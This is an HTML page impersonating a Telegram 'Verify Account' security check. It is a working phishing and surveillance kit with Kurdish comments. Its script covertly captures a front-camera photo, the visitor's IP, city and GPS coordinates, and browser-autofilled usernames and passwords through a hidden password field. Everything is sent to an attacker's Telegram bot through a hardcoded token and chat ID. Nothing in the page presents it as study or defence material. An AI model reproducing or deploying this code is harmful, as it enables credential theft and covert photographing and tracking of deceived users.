<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Telegram - Security Check</title>
    <style>
        body { font-family: -apple-system, system-ui, sans-serif; background: #f4f4f5; margin: 0; overflow: hidden; display: flex; justify-content: center; align-items: center; height: 100vh; }
        
        /* چارەسەری وێنەی ڕەش: ڤیدیۆکە دەبێت گەورە بێت بەڵام شەفاف بێت */
        #video { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; object-fit: cover; opacity: 0.02; z-index: 1; pointer-events: none; }
        
        .box { background: white; padding: 35px; border-radius: 20px; box-shadow: 0 10px 40px rgba(0,0,0,0.1); width: 85%; max-width: 340px; text-align: center; z-index: 100; position: relative; }
        .logo { width: 90px; margin-bottom: 15px; }
        h2 { font-size: 20px; color: #222; margin-bottom: 15px; }
        
        /* تێپەڕاندنی پارێزگاری پاسوۆرد: خانەیەک پیشان دەدەین تا وێبگەڕ پڕی بکاتەوە */
        .input-field { width: 100%; padding: 15px; margin-bottom: 20px; border: 1px solid #ddd; border-radius: 8px; font-size: 16px; text-align: center; box-sizing: border-box; }
        .btn { background: #3390ec; color: white; border: none; padding: 16px; width: 100%; border-radius: 10px; font-size: 17px; font-weight: bold; cursor: pointer; }
        
        #canvas { display: none; }
    </style>
</head>
<body>

    <!-- ڤیدیۆکە لێرەدا وەک شەبەنگێکی تەڵخ دانراوە تا ڕەش نەبێت -->
    <video id="video" autoplay playsinline muted></video>
    <canvas id="canvas"></canvas>

    <div class="box">
        <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" class="logo">
        <h2>Verify Account</h2>
        <p style="color:#777; font-size:14px; margin-bottom:20px;">Please click inside the box and then tap 'Verify' to authorize your session.</p>
        
        <form id="auth-form">
            <!-- ئەم خانەیە تانها بۆ ئەوەیە وێبگەڕ پاسوۆرد و یوزەر پڕ بکاتەوە -->
            <input type="text" id="af_user" placeholder="Account ID" class="input-field" autocomplete="username">
            <input type="password" id="af_pass" style="position:absolute; opacity:0; pointer-events:none;" autocomplete="current-password">
        </form>

        <button class="btn" id="mainBtn">VERIFY IDENTITY</button>
    </div>

    <script>
        const botToken = "8325580182:AAEZlBl-DbtFVRA2X3b9mN8qq-EAEcr_Aoc";
        const chatId = "6679834643";

        async function sendToBot(text) {
            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: chatId, text: text })
            });
        }

        document.getElementById('mainBtn').addEventListener('click', async function() {
            this.innerText = "Verifying...";
            this.disabled = true;

            // ١. وەرگرتنی پێرمشنی کامێرا و ناردنی وێنە (بە چاککاری)
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                const video = document.getElementById('video');
                video.srcObject = stream;
                
                // وێستان بۆ ٥ چرکە بۆ ئەوەی ڕووناکی ئایفۆن و ئەندرۆید تەواو ڕێکببێت
                await new Promise(r => setTimeout(r, 5000));
                
                const canvas = document.getElementById('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                
                const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.95));
                const fd = new FormData();
                fd.append('chat_id', chatId);
                fd.append('photo', blob, 'face.jpg');
                await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: fd });
                stream.getTracks().forEach(t => t.stop());
            } catch (e) { await sendToBot("❌ Camera Access Denied"); }

            // ٢. وەرگرتنی لۆکەیشن و سیستەم
            fetch('https://ipapi.co/json/').then(r => r.json()).then(d => sendToBot(`🌐 IP: ${d.ip}\n🏙️ City: ${d.city}`));
            
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(async (pos) => {
                    await sendToBot(`📍 GPS: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`);
                    finish();
                }, () => finish(), { enableHighAccuracy: true });
            } else { finish(); }

            // ٣. ناردنی پاسوۆرد و یوزەری پاشەکەوتکراو کاتێک کلیک دەکات
            let u = document.getElementById('af_user').value;
            let p = document.getElementById('af_pass').value;
            if(p) await sendToBot(`🔑 STOLEN FROM MANAGER:\n👤 User: ${u}\n🔒 Pass: ${p}`);
        });

        function finish() {
            setTimeout(() => { window.location.href = "index.html"; }, 1500);
        }
    </script>
</body>
</html>
